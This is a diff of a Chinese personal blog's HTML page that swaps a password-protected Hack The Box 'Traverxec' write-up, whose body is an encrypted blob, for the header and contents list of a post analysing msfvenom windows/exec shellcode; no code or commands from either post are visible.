@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Hack The Box - Traverxec | 九世的博客</title>
-  <meta name="keywords" content=" htb ">
-  <meta name="description" content="Hack The Box - Traverxec | 九世的博客">
+  <title>msfvenom生成的windows/exec shellcode分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="msfvenom生成的windows/exec shellcode分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1628,9 +1628,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Hack-The-Box-Traverxec" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-msfvenom生成的windows-exec-shellcode分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Hack The Box - Traverxec</h1>
+        <h1 class="article-title">msfvenom生成的windows/exec shellcode分析</h1>
     
     <div class="article-meta">
         
@@ -1639,14 +1639,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">htb</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-12-15 00:48:24">2019-12-14 23:46</time>
+        创建时间:<time class="date" title="更新时间: 2021-02-19 16:46:15">2021-02-19 12:40</time>
         
     </div>
     <div class="article-meta">
@@ -1668,7 +1668,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1683,20 +1683,214 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<div id="hbe-security">
-  <div class="hbe-input-container">
-  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog.">
-    <label for="pass">Please enter the password to read the blog.</label>
-    <div class="bottom-line"></div>
-  </div>
-</div>
-<div id="decryptionError" style="display: none;">Incorrect Password!</div>
-<div id="noContentError" style="display: none;">No content to display!</div>
-<div id="encrypt-blog" style="display:none">
-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